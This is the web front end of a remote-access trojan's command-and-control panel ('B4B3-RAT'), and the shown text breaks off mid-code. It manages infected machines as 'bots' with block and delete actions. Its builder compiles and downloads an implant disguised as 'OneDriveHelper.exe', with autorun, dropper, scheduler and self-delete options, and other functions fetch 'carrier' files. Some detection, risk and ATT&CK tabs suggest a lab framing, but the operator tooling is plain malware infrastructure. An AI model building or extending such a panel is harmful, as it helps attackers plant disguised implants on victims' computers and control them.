<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>B4B3-RAT C2 Dashboard</title>
<script src="js/config.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0D1B2A;--bg2:#1A2E42;--bg3:#243C57;--accent:#00C2A8;--warn:#F4A261;--text:#E8EEF4;--muted:#6B7FA3;--light:#BDD3E8;--r:10px}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column}
header{background:var(--bg2);border-bottom:1px solid var(--bg3);padding:0 24px;display:flex;align-items:center;gap:16px;height:52px;flex-shrink:0}
.logo{font-family:monospace;font-size:12px;color:var(--accent);letter-spacing:2px}
.page-nav{display:flex;gap:2px;margin-left:8px}
.pnav{background:none;border:none;color:var(--muted);font-size:13px;padding:6px 12px;border-radius:6px;cursor:pointer;font-family:inherit}
.pnav:hover{background:var(--bg3);color:var(--light)}
.pnav.active{background:var(--bg3);color:var(--accent);font-weight:600}
.spacer{flex:1}
.auto-row{display:flex;align-items:center;gap:6px;font-size:13px;color:var(--muted)}
.auto-row input{accent-color:var(--accent)}
a{color:var(--accent);text-decoration:none}
.layout{display:flex;flex:1;overflow:hidden}
.sidebar{width:260px;background:var(--bg2);border-right:1px solid var(--bg3);display:flex;flex-direction:column;flex-shrink:0;overflow:hidden}
.sb-head{padding:14px 14px 8px;display:flex;align-items:center;justify-content:space-between}
.sb-head h2{font-size:11px;font-weight:600;color:var(--muted);letter-spacing:1px;text-transform:uppercase}
.sb-count{background:var(--bg3);color:var(--light);font-size:11px;padding:2px 7px;border-radius:20px}
#bot-list{flex:1;overflow-y:auto;padding:4px 8px 12px}
.bot-item{padding:9px 11px;border-radius:var(--r);cursor:pointer;margin-bottom:3px;border:1px solid transparent}
.bot-item:hover{background:var(--bg3)}
.bot-item.active{background:var(--bg3);border-color:var(--accent)}
.bot-id{font-family:monospace;font-size:12px;color:var(--accent)}
.bot-seen{font-size:11px;color:var(--muted);margin-top:2px}
.bot-badges{display:flex;gap:4px;margin-top:4px;flex-wrap:wrap}
.bot-risk{display:flex;align-items:center;gap:5px;margin-top:4px}
.bot-risk-bar{flex:1;height:4px;background:var(--bg3);border-radius:2px}
.bot-risk-fill{height:100%;border-radius:2px}
.bot-risk-score{font-size:10px;font-family:monospace;color:var(--muted)}
.main{flex:1;overflow-y:auto;display:flex;flex-direction:column}
.tab-bar{display:flex;gap:1px;background:var(--bg3);border-bottom:1px solid var(--bg3);flex-shrink:0;overflow-x:auto}
.tab{background:var(--bg2);border:none;color:var(--muted);font-size:12px;padding:9px 14px;cursor:pointer;font-family:inherit;white-space:nowrap;border-right:1px solid var(--bg3)}
.tab:hover{color:var(--light)}
.tab.active{color:var(--accent);font-weight:600;background:var(--bg)}
.tab-content{flex:1;padding:20px 24px;display:flex;flex-direction:column;gap:16px;overflow-y:auto}
.card{background:var(--bg2);border:1px solid var(--bg3);border-radius:14px;padding:20px;display:flex;flex-direction:column;gap:12px}
.card-title{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.info-item label{font-size:11px;color:var(--muted);display:block;margin-bottom:2px}
.info-item p{font-size:13px;color:var(--light);font-family:monospace}
.sysinfo{background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:12px;font-family:monospace;font-size:12px;color:var(--light);line-height:1.7;white-space:pre-wrap;word-break:break-all;max-height:160px;overflow-y:auto}
.cmd-row{display:flex;gap:8px}
.cmd-row input{flex:1;background:var(--bg);border:1px solid var(--bg3);border-radius:7px;color:var(--text);font-family:monospace;font-size:13px;padding:9px 12px;outline:none}
.cmd-row input:focus{border-color:var(--accent)}
.btn{cursor:pointer;border:none;border-radius:7px;font-family:inherit;font-size:13px;padding:8px 16px}
.btn-send{background:var(--accent);color:var(--bg);font-weight:700}
.btn-send:hover{background:#00a896}
.btn-sec{background:var(--bg3);color:var(--light)}
.btn-sec:hover{background:var(--accent);color:var(--bg)}
.btn-danger{background:#2A0E0E;color:#f47061;border:1px solid #5a1a1a}
.btn-danger:hover{background:#5a1a1a}
.btn-export{background:#12172a;color:#7b9ff0;border:1px solid #2a3a6a;font-size:12px}
.btn-export:hover{background:#1e2d55}
.btn-lab{background:#12221a;color:#00C2A8;border:1px solid #1a4a3a;font-size:12px;white-space:nowrap}
.btn-lab:hover{background:#1a3a2a}
.lab-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px;margin-top:12px}
.lab-action-card{background:var(--bg2);border:1px solid var(--bg3);border-radius:8px;padding:12px 14px}
.lab-action-name{font-size:13px;font-weight:600;color:var(--fg);margin-bottom:3px}
.lab-action-desc{font-size:11px;color:var(--muted);margin-bottom:6px;line-height:1.5}
.lab-action-meta{display:flex;gap:8px;align-items:center}
.lab-phase{background:#1a2030;border:1px solid #2a3050;border-radius:4px;padding:1px 7px;font-size:10px;color:#9ab0e0}
.lab-table{width:100%;border-collapse:collapse;font-size:12px;margin-top:8px}
.lab-table th{text-align:left;color:var(--muted);font-weight:500;padding:6px 8px;border-bottom:1px solid var(--bg3)}
.lab-table td{padding:6px 8px;border-bottom:1px solid var(--bg2);color:var(--light);vertical-align:middle}
.lab-meta-row{padding:8px 0 4px;display:flex;align-items:center;gap:8px}
.cov-dot{font-size:14px;font-weight:700;margin-right:2px}
.cov-covered{color:#00C2A8}.cov-gap{color:#e84242}.cov-untested{color:var(--muted)}
.cov-row.gap td{background:rgba(232,66,66,0.04)}
.cov-row.covered td{background:rgba(0,194,168,0.03)}
.cov-rec{font-size:10px;color:#F4A261;margin-top:2px}
.cov-run-card{background:var(--bg2);border:1px solid var(--bg3);border-radius:8px;padding:12px 14px}
.cov-run-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.cov-run-stats{display:flex;gap:16px;font-size:12px;color:var(--muted)}
.cov-pct{font-size:20px;font-weight:700}
.results-box,.sysinfo{background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:12px;font-family:monospace;font-size:12px;color:var(--light);line-height:1.7;max-height:240px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.res-entry{padding-bottom:8px;margin-bottom:8px;border-bottom:1px solid var(--bg3)}
.res-entry:last-child{border-bottom:none}
.res-time{color:var(--muted);font-size:10px;margin-bottom:2px}
.files-grid{display:flex;flex-wrap:wrap;gap:8px}
.file-card{background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:8px 12px;display:flex;align-items:center;gap:7px}
.file-card a{font-family:monospace;font-size:11px;color:var(--accent)}
.bdg{font-size:10px;padding:2px 7px;border-radius:20px;font-weight:600}
.bdg-cmd{background:#2A1F0E;color:var(--warn)}
.bdg-files{background:#0E2A22;color:var(--accent)}
.bdg-high{background:#3a1010;color:#f06060}
.bdg-inc{background:#3a1515;color:#f06060}
.ping{width:6px;height:6px;border-radius:50%;display:inline-block;margin-right:4px}
.ping-alive{background:#00C2A8;box-shadow:0 0 4px #00C2A8}
.ping-stale{background:#6B7FA3}
.section-hdr{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
.empty{color:var(--muted);font-size:13px;text-align:center;padding:28px;font-style:italic}
.risk-big{font-size:48px;font-weight:800;font-family:monospace;line-height:1}
.risk-level{font-size:13px;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-top:4px}
.risk-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:var(--bg);border:1px solid var(--bg3);border-radius:8px}
.risk-item-score{font-size:16px;font-weight:700;font-family:monospace;min-width:36px;text-align:right}
.risk-item-bar{flex:1;height:5px;background:var(--bg3);border-radius:3px;overflow:hidden}
.risk-item-fill{height:100%;border-radius:3px;background:var(--accent)}
.risk-item-name{font-size:13px;font-weight:600;color:var(--light)}
.risk-item-desc{font-size:11px;color:var(--muted)}
.evt-toolbar{display:flex;align-items:center;gap:7px;flex-wrap:wrap}
.evt-filter{background:var(--bg);border:1px solid var(--bg3);border-radius:6px;color:var(--light);font-size:12px;padding:5px 9px;outline:none}
.evt-filter:focus{border-color:var(--accent)}
.events-box{display:flex;flex-direction:column;gap:5px;max-height:420px;overflow-y:auto}
.evt{background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:10px 12px;display:flex;flex-direction:column;gap:4px}
.evt.sev-critical{border-left:4px solid #e84242}
.evt.sev-high{border-left:4px solid #e8622a}
.evt.sev-medium{border-left:4px solid #F4A261}
.evt.sev-low{border-left:4px solid #4a90d9}
.evt.sev-info{border-left:4px solid #6B7FA3}
.evt-hdr{display:flex;align-items:center;gap:7px;flex-wrap:wrap}
.sev-badge{font-size:9px;font-weight:700;padding:2px 7px;border-radius:20px;letter-spacing:1px}
.sev-badge.critical{background:#3a0a0a;color:#e84242}
.sev-badge.high{background:#3a1a0a;color:#e8622a}
.sev-badge.medium{background:#3a2a0a;color:#F4A261}
.sev-badge.low{background:#0a1a3a;color:#4a90d9}
.sev-badge.info{background:#1a2a3a;color:#6B7FA3}
.evt-rule{font-family:monospace;font-size:11px;color:var(--accent);background:var(--bg2);padding:2px 7px;border-radius:5px}
.evt-atk{font-size:10px;padding:2px 7px;border-radius:5px;background:#12172a;color:#7b9ff0;border:1px solid #2a3a6a;font-family:monospace;text-decoration:none}
.evt-atk:hover{background:#1e2d55;color:#a0b8ff}
.evt-cat{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
.evt-ts{font-size:10px;color:var(--muted);margin-left:auto}
.evt-msg{font-size:13px;color:var(--light);font-weight:500}
.evt-data{font-family:monospace;font-size:11px;color:var(--muted);word-break:break-all}
.inc{background:var(--bg);border:1px solid var(--bg3);border-radius:10px;padding:14px 16px;display:flex;flex-direction:column;gap:8px}
.inc.sev-critical{border-left:4px solid #e84242}
.inc.sev-high{border-left:4px solid #e8622a}
.inc.sev-medium{border-left:4px solid #F4A261}
.inc-hdr{display:flex;align-items:center;gap:7px;flex-wrap:wrap}
.inc-name{font-size:13px;font-weight:600;color:var(--text);flex:1}
.inc-ts{font-size:10px;color:var(--muted);margin-left:auto;white-space:nowrap}
.inc-desc{font-size:12px;color:var(--muted);line-height:1.5}
.confidence-row{display:flex;align-items:center;gap:8px}
.confidence-bar{flex:1;height:5px;background:var(--bg3);border-radius:3px;overflow:hidden}
.confidence-fill{height:100%;border-radius:3px}
.confidence-fill.conf-critical{background:#e84242}
.confidence-fill.conf-high{background:#e8622a}
.confidence-fill.conf-medium{background:#F4A261}
.confidence-fill.conf-low{background:#4a90d9}
.confidence-fill.conf-ok{background:var(--accent)}
.confidence-pct{font-size:11px;font-weight:700;color:var(--light);min-width:30px;text-align:right}
.inc-evidence{display:flex;flex-direction:column;gap:3px}
.inc-ev-item{font-family:monospace;font-size:11px;color:var(--muted);background:var(--bg2);padding:4px 8px;border-radius:5px;display:flex;gap:7px;align-items:center;flex-wrap:wrap}
.inc-ev-dr{color:var(--accent);font-size:10px}
.inc-status{font-size:11px;cursor:pointer;padding:2px 8px;border-radius:20px;border:none;font-family:inherit}
.inc-status.open{background:#3a1010;color:#f06060}
.inc-status.closed{background:#0e2a22;color:var(--accent)}
.net-flow{display:flex;flex-direction:column;gap:3px;font-family:monospace;font-size:11px}
.net-flow-row{display:flex;align-items:center;gap:6px;padding:4px 8px;background:var(--bg);border:1px solid var(--bg3);border-radius:5px}
.net-flow-ts{color:var(--muted);font-size:10px;width:68px;flex-shrink:0}
.net-flow-src{color:#7b9ff0;width:100px;flex-shrink:0;overflow:hidden;text-overflow:ellipsis}
.net-flow-method{font-weight:700;width:32px;flex-shrink:0}
.net-flow-method.GET{color:var(--accent)}
.net-flow-method.POST{color:var(--warn)}
.net-flow-path{flex:1;color:var(--light);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.net-flow-bytes{color:var(--muted);font-size:10px;text-align:right;white-space:nowrap}
.beacon-bar{display:flex;flex-direction:column;gap:7px;padding:12px;background:var(--bg);border:1px solid var(--bg3);border-radius:8px}
.beacon-stat-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.beacon-stat{display:flex;flex-direction:column;gap:2px;flex:1;min-width:80px}
.beacon-stat label{font-size:10px;color:var(--muted)}
.beacon-stat p{font-size:14px;font-weight:700;font-family:monospace;color:var(--light)}
.beacon-flag-alert{background:#2a0e0e;border:1px solid #5a2020;border-radius:7px;padding:9px 12px;font-size:12px;color:#f06060}
.beacon-flag-ok{background:#0e2a1a;border:1px solid #205a30;border-radius:7px;padding:9px 12px;font-size:12px;color:var(--accent)}
.flow-diagram{font-family:monospace;font-size:12px;line-height:1.9;color:var(--light);background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:14px;white-space:pre}
.ioc-table{width:100%;border-collapse:collapse;font-size:12px}
.ioc-table th{text-align:left;color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:1px;padding:6px 10px;border-bottom:1px solid var(--bg3)}
.ioc-table td{padding:5px 10px;font-family:monospace;color:var(--light);border-bottom:1px solid var(--bg3);word-break:break-all}
.ioc-type{font-size:10px;padding:2px 8px;border-radius:20px;font-weight:600;white-space:nowrap}
.ioc-file{background:#0e2030;color:#7b9ff0}
.ioc-ip{background:#1a2a0a;color:#90d060}
.ioc-registry{background:#2a1a0a;color:var(--warn)}
.ioc-port{background:#0a1a2a;color:#60a0d0}
.ioc-process{background:#1a0a2a;color:#b060d0}
.ioc-service{background:#2a0a0a;color:#f06060}
.ioc-ext{background:#0a2a1a;color:var(--accent)}
.export-row{display:flex;gap:8px;flex-wrap:wrap}
.atk-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
.atk-card{background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:10px 12px;display:flex;flex-direction:column;gap:4px}
.atk-id{font-family:monospace;font-size:11px;color:#7b9ff0;font-weight:700}
.atk-name{font-size:12px;color:var(--light)}
.atk-count{font-size:10px;color:var(--muted)}
.ov-stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px}
.ov-stat{background:var(--bg2);border:1px solid var(--bg3);border-radius:12px;padding:16px;text-align:center}
.ov-stat-n{font-size:36px;font-weight:800;font-family:monospace;color:var(--accent)}
.ov-stat-l{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
.ov-timeline{display:flex;flex-direction:column;gap:4px;max-height:350px;overflow-y:auto}
.ov-tl-item{display:flex;align-items:flex-start;gap:10px;padding:7px 10px;background:var(--bg2);border:1px solid var(--bg3);border-radius:7px}
.ov-tl-dot{width:8px;height:8px;border-radius:50%;margin-top:4px;flex-shrink:0}
.ov-tl-ts{font-family:monospace;font-size:10px;color:var(--muted);white-space:nowrap;min-width:60px}
.ov-tl-bot{font-family:monospace;font-size:10px;color:var(--accent);min-width:48px}
.ov-tl-msg{font-size:12px;color:var(--light)}
.report-pre{background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:16px;font-family:monospace;font-size:11px;color:var(--light);line-height:1.7;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto}

/* ── Hamburger button (hidden on desktop) ── */
.hamburger{display:none;background:none;border:none;color:var(--muted);font-size:20px;cursor:pointer;padding:4px 8px;line-height:1;flex-shrink:0}
.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:99}

/* ── Mobile responsive ── */
@media(max-width:768px){
  /* Header */
  header{padding:0 12px;gap:8px;flex-wrap:nowrap;height:48px}
  .hamburger{display:block}
  .page-nav{gap:0;overflow-x:auto;scrollbar-width:none}
  .page-nav::-webkit-scrollbar{display:none}
  .pnav{font-size:12px;padding:5px 8px}
  .auto-row span{display:none}
  .logo{font-size:11px}

  /* Sidebar becomes slide-in overlay */
  .sidebar{
    position:fixed;left:-270px;top:0;bottom:0;z-index:100;
    width:260px;transition:left .25s ease;
    box-shadow:4px 0 20px rgba(0,0,0,.5);
  }
  .sidebar.open{left:0}
  .sidebar-overlay.open{display:block}

  /* Main takes full width */
  .layout{flex-direction:column}
  .main{width:100%}

  /* Tab bar — smaller text, scroll */
  .tab{font-size:11px;padding:8px 10px}
  .tab-content{padding:12px}

  /* Info grid → single column */
  .info-grid{grid-template-columns:1fr}

  /* Command row stacks */
  .cmd-row{flex-direction:column}
  .cmd-row input{width:100%}
  .btn-send{width:100%;padding:10px}

  /* Overview stats → 2 column */
  .ov-stats{grid-template-columns:1fr 1fr}
  .ov-stat-n{font-size:28px}

  /* Builder grid → single column */
  #builder-form-grid{grid-template-columns:1fr!important}

  /* ATT&CK grid */
  .atk-grid{grid-template-columns:1fr 1fr}

  /* Lab grid */
  .lab-grid{grid-template-columns:1fr}

  /* Net flow — hide fixed-width cols on small screens */
  .net-flow-src{width:70px}
  .net-flow-ts{width:50px;font-size:9px}

  /* Risk score */
  .risk-big{font-size:36px}

  /* IOC table — allow wrap */
  .ioc-table{display:block;overflow-x:auto}

  /* Flow diagram — scroll */
  .flow-diagram{overflow-x:auto;font-size:10px}

  /* Cards */
  .card{padding:14px}

  /* Export row */
  .export-row{flex-direction:column}
  .export-row .btn{width:100%}

  /* Keylogger buttons */
  .section-hdr{flex-direction:column;align-items:flex-start}
}

@media(max-width:420px){
  .ov-stats{grid-template-columns:1fr}
  .atk-grid{grid-template-columns:1fr}
  .pnav{font-size:11px;padding:4px 6px}
}
/* ── Bot sidebar actions ── */
.bot-blocked{opacity:.65;border-left:3px solid #e84242!important}
.bot-actions{display:none;gap:4px;margin-top:6px}
.bot-item:hover .bot-actions{display:flex}
.bot-act-btn{font-size:10px;padding:3px 8px;border-radius:5px;border:1px solid var(--bg3);background:var(--bg3);color:var(--light);cursor:pointer;font-family:inherit}
.bot-act-btn:hover{background:var(--warn);color:var(--bg);border-color:var(--warn)}
.bot-act-del:hover{background:#e84242;color:#fff;border-color:#e84242}
.bot-status-online{color:#00C2A8;font-size:10px;font-weight:700}
.bot-status-offline{color:#6B7FA3;font-size:10px}
.bot-status-blocked{color:#e84242;font-size:10px;font-weight:700}
/* ── File Manager Terminal ── */
.fm-wrap{display:flex;flex-direction:column;background:var(--bg2);border:1px solid var(--bg3);border-radius:14px;overflow:hidden;flex:1;min-height:500px}
.fm-titlebar{padding:12px 16px;border-bottom:1px solid var(--bg3);display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
.fm-output{flex:1;background:var(--bg);font-family:monospace;font-size:12px;color:var(--light);padding:12px 16px;overflow-y:auto;line-height:1.8;white-space:pre-wrap;word-break:break-all;min-height:0}
.fm-inputrow{display:flex;align-items:stretch;border-top:1px solid var(--bg3);background:var(--bg2);flex-shrink:0}

<script>
let selId = null, currentTab = 'summary', currentPage = 'overview', refreshTimer = null;

async function api(url, opts={}) {
  const r = await fetch(API_BASE + url, {
    ...opts,
    credentials: 'include',
    headers: { 'Content-Type': 'application/json', ...(opts.headers||{}) },
  });
  if (!r.ok) throw new Error(await r.text());
  return r.json();
}

function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function fmtBytes(b){if(b<1024)return b+'B';if(b<1048576)return (b/1024).toFixed(1)+'KB';return (b/1048576).toFixed(1)+'MB';}
function riskColor(s){return s>=100?'#e84242':s>=65?'#e8622a':s>=35?'#F4A261':'#00C2A8';}
function riskLabel(s){return s>=100?'CRITICAL':s>=65?'HIGH':s>=35?'MEDIUM':'LOW';}

function toggleSidebar() {
  const sb = document.getElementById('sidebar');
  const ov = document.getElementById('sidebar-overlay');
  sb.classList.toggle('open');
  ov.classList.toggle('open');
}

async function doLogout() {
  try { await fetch(API_BASE + '/api/auth/logout', { credentials: 'include' }); } catch(_){}
  window.location.href = 'login.html';
}

// ── Page navigation ───────────────────────────────────────────────────────────

function showPage(p) {
  currentPage = p;
  document.querySelectorAll('.pnav').forEach(el=>el.classList.remove('active'));
  document.getElementById('pnav-'+p)?.classList.add('active');
  document.getElementById('tab-bar').style.display = p==='bot' ? 'flex' : 'none';
  if (p==='overview')     renderOverview();
  else if (p==='bot' && selId) renderTab(selId, currentTab);
  else if (p==='android') renderAndroidPage();
  else if (p==='builder') renderBuilder();
  else if (p==='docs')    renderDocs();
}

function switchTab(tab) {
  currentTab = tab;
  document.querySelectorAll('.tab').forEach(el=>el.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(el=>{if(el.getAttribute('onclick')?.includes("'"+tab+"'"))el.classList.add('active');});
  if (selId) renderTab(selId, currentTab);
}

// ── Sidebar ───────────────────────────────────────────────────────────────────

async function loadBots() {
  try {
    const bots = await api('/api/bots');
    document.getElementById('bot-count').textContent = bots.length;
    const list = document.getElementById('bot-list');
    list.innerHTML = '';
    if (!bots.length) { list.innerHTML = '<div class="empty" style="padding:16px 12px">Waiting for check-ins&hellip;</div>'; return; }
    bots.sort((a,b)=>new Date(b.lastSeen)-new Date(a.lastSeen));
    bots.forEach(b => {
      const age = Math.floor((Date.now()-new Date(b.lastSeen))/1000);
      const alive = age<60 && !b.blocked;
      const score = b.riskScore||0;
      const fillPct = Math.min(score/200*100,100);
      const d = document.createElement('div');
      d.className = 'bot-item'+(b.id===selId?' active':'')+(b.blocked?' bot-blocked':'');
      d.dataset.botId = b.id;
      const statusHtml = b.blocked
        ? '<span class="bot-status-blocked">⛔ BLOCKED</span>'
        : alive
          ? '<span class="bot-status-online">● ONLINE</span>'
          : '<span class="bot-status-offline">○ OFFLINE</span>';
      d.innerHTML = `
        <div class="bot-id" style="display:flex;align-items:center;justify-content:space-between">
          <span><span class="ping ${alive?'ping-alive':'ping-stale'}"></span>Bot #${esc(b.id)}</span>
          ${statusHtml}
        </div>
        <div class="bot-seen">${b.blocked?'blocked':'last seen '+(age<5?'just now':age+'s ago')}</div>
        <div class="bot-badges">
          ${b.openIncidents?'<span class="bdg bdg-inc">'+b.openIncidents+' inc</span>':''}
          ${b.highEvents?'<span class="bdg bdg-high">'+b.highEvents+' alert</span>':''}
          ${b.fileCount?'<span class="bdg bdg-files">'+b.fileCount+'f</span>':''}
        </div>
        <div class="bot-risk">
          <div class="bot-risk-bar"><div class="bot-risk-fill" style="width:${fillPct}%;background:${riskColor(score)}"></div></div>
          <span class="bot-risk-score">${score}</span>
        </div>
        <div class="bot-actions">
          <button class="bot-act-btn" title="${b.blocked?'Unblock':'Block'} bot"
            onclick="event.stopPropagation();botBlock('${esc(b.id)}')">${b.blocked?'✔ Unblock':'🚫 Block'}</button>
          <button class="bot-act-btn bot-act-del" title="Delete bot from dashboard"
            onclick="event.stopPropagation();botDelete('${esc(b.id)}')">🗑 Delete</button>
        </div>`;
      d.onclick = ()=>{ if(!b.blocked) selectBot(b.id); };
      list.appendChild(d);
    });
  } catch(e) { console.error(e); }
}

async function fillBuilderFromServer() {
  try {
    const r = await fetch(API_BASE + '/api/builder/config', { credentials: 'include' });
    if (!r.ok) return;
    const d = await r.json();
    if (d.host)    document.getElementById('b-host').value = d.host;
    if (d.authKey) document.getElementById('b-auth').value = d.authKey;
  } catch(_) {}
}

async function doBuild() {
  const host = document.getElementById('b-host').value.trim();
  const auth = document.getElementById('b-auth').value.trim();
  if (!host) { showBuildStatus('C2 Host:Port is required', 'error'); return; }
  if (!auth) { showBuildStatus('Auth Key is required', 'error'); return; }

  const btn = document.getElementById('b-btn');
  btn.disabled = true;
  btn.textContent = 'Building\u2026';
  showBuildStatus('Contacting server\u2026', 'info');

  try {
    const body = {
      c2Host:     host,
      authKey:    auth,
      delay:      document.getElementById('b-delay').value || '5000',
      autorun:    document.getElementById('b-autorun').value.trim() || '',
      drop:       document.getElementById('b-drop').value.trim() || '',
      scheduler:  document.getElementById('b-sched').value.trim() || '',
      dropRun:    document.getElementById('b-droprun').checked,
      autoDelete: document.getElementById('b-autodel').checked,
    };
    const resp = await fetch(API_BASE + '/api/build', {
      method: 'POST', credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    if (!resp.ok) {
      const err = await resp.json().catch(()=>({error:resp.statusText}));
      throw new Error(err.error || resp.statusText);
    }
    const blob = await resp.blob();
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = 'OneDriveHelper.exe';
    document.body.appendChild(a); a.click(); a.remove();
    URL.revokeObjectURL(url);
    showBuildStatus('Download started \u2014 OneDriveHelper.exe is ready (' + Math.round(blob.size/1024) + ' KB)', 'ok');
  } catch(e) {
    showBuildStatus('Error: ' + e.message, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '&#8659; Build &amp; Download OneDriveHelper.exe';
  }
}

function showBuildStatus(msg, type) {
  const el = document.getElementById('b-status');
  if (!el) return;
  el.style.display  = 'block';
  el.style.background = type==='error'?'#2a0e0e':type==='ok'?'#0e2a1a':'#12172a';
  el.style.color      = type==='error'?'#f06060':type==='ok'?'var(--accent)':'#7b9ff0';
  el.style.border     = '1px solid '+(type==='error'?'#5a1a1a':type==='ok'?'#1a4a2a':'#2a3a6a');
  el.textContent = msg;
}

async function refreshStubStatus() {
  const el = document.getElementById('compile-stub-info');
  if (!el) return;
  try {
    const r = await fetch(API_BASE + '/api/builder/stub-status', { credentials: 'include' });
    if (!r.ok) return;
    const d = await r.json();
    if (d.exists) {
      const kb  = (d.size / 1024).toFixed(1);
      const dt  = new Date(d.mtime).toLocaleString();
      el.textContent = `Current: Stub.exe  ${kb} KB  —  ${dt}`;
      el.style.color = 'var(--accent)';
    } else {
      el.textContent = 'No Stub.exe found — compile below or upload manually.';
      el.style.color = 'var(--warn)';
    }
  } catch(_) { el.textContent = ''; }
}

function doCompile() {
  const btn = document.getElementById('compile-btn');
  const log = document.getElementById('compile-log');
  if (!btn || !log) return;
  btn.disabled = true;
  btn.textContent = 'Compiling…';
  log.style.display = 'block';
  log.textContent   = '';

  const es = new EventSource(API_BASE + '/api/builder/compile', { withCredentials: true });
  // POST is needed, but EventSource only does GET — use fetch+ReadableStream instead
  es.close();

  const appendLog = line => { log.textContent += line + '\n'; log.scrollTop = log.scrollHeight; };

  fetch(API_BASE + '/api/builder/compile', {
    method: 'POST', credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: '{}',
  }).then(resp => {
    if (!resp.ok) { appendLog('[ERROR] Server returned ' + resp.status); btn.disabled = false; btn.textContent = '⚙ Compile Stub.exe on Server'; return; }
    const reader = resp.body.getReader();
    const dec    = new TextDecoder();
    let   buf    = '';
    function pump() {
      reader.read().then(({ done, value }) => {
        if (done) {
          btn.disabled = false;
          btn.textContent = '⚙ Compile Stub.exe on Server';
          refreshStubStatus();
          return;
        }
        buf += dec.decode(value, { stream: true });
        const lines = buf.split('\n');
        buf = lines.pop();
        for (const l of lines) {
          const trimmed = l.replace(/^data: /, '');
          if (trimmed === '[DONE]') { btn.disabled = false; btn.textContent = '⚙ Compile Stub.exe on Server'; refreshStubStatus(); reader.cancel(); return; }
          if (trimmed) appendLog(trimmed);
        }
        pump();
      }).catch(() => { btn.disabled = false; btn.textContent = '⚙ Compile Stub.exe on Server'; });
    }
    pump();
  }).catch(e => {
    appendLog('[ERROR] ' + e.message);
    btn.disabled = false;
    btn.textContent = '⚙ Compile Stub.exe on Server';
  });
}

async function downloadCarrier(type) {
  try {
    const r = await fetch(API_BASE + '/api/builder/carrier?type=' + type, { credentials: 'include' });
    if (!r.ok) { const e = await r.json().catch(()=>({error:r.statusText})); alert('Carrier error: ' + (e.error||r.statusText)); return; }
    const blob = await r.blob();
    const cd   = r.headers.get('content-disposition') || '';
    const m    = cd.match(/filename="([^"]+)"/);
    const name = m ? m[1] : 'carrier.' + type;
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = name;
    document.body.appendChild(a); a.click(); a.remove();
    URL.revokeObjectURL(url);
  } catch(e) { alert('Download failed: ' + e.message); }
}

async function selectBot(id) {
  selId = id;
  document.querySelectorAll('.bot-item').forEach(el=>el.classList.remove('active'));
  document.querySelectorAll('.bot-item[data-bot-id="'+id+'"]').forEach(el=>el.classList.add('active'));
  document.getElementById('pnav-bot').style.display='';
  const sb = document.getElementById('sidebar');
  const ov = document.getElementById('sidebar-overlay');
  if(sb.classList.contains('open')){ sb.classList.remove('open'); ov.classList.remove('open'); }
  showPage('bot');
}

async function botBlock(id) {
  try {
    await api('/api/bot/'+id+'/block', { method: 'PATCH', body: '{}' });
    await loadBots();
    // If currently viewing this bot, refresh it
    if (selId === id) { selId = null; document.getElementById('pnav-bot').style.display='none'; renderOverview(); }
  } catch(e) { alert('Block failed: ' + e.message); }
}

async function botDelete(id) {
  if (!confirm('Delete Bot #' + id + ' from the dashboard?\n\nThe bot data will be saved to disk. If the bot checks in again it will re-appear as a new entry.')) return;
  try {
    await api('/api/bot/'+id, { method: 'DELETE' });
    if (selId === id) { selId = null; document.getElementById('pnav-bot').style.display='none'; }
    await loadBots();
    if (selId === id) renderOverview();
  } catch(e) { alert('Delete failed: ' + e.message); }
}

async function renderTab(id, tab) {
  const bot = await api('/api/bot/'+id).catch(()=>null);
  if (!bot) { document.getElementById('main-content').innerHTML='<div class="empty">Bot not found.</div>'; return; }
  document.querySelectorAll('.tab').forEach(el=>{
    el.classList.toggle('active', !!(el.getAttribute('onclick')?.includes("'"+tab+"'")));
  });
  switch(tab) {
    case 'summary':     renderSummary(bot); break;
    case 'risk':        renderRisk(bot); break;
    case 'timeline':    renderTimeline(bot); break;
    case 'network':     renderNetwork(bot); break;
    case 'persistence': renderPersistence(bot); break;
    case 'attack':      renderAttack(bot); break;
    case 'detections':  renderDetections(bot); break;
    case 'incidents':   renderIncidents(bot); break;
    case 'iocs':        renderIOCs(bot); break;
    case 'report':      renderReport(bot); break;
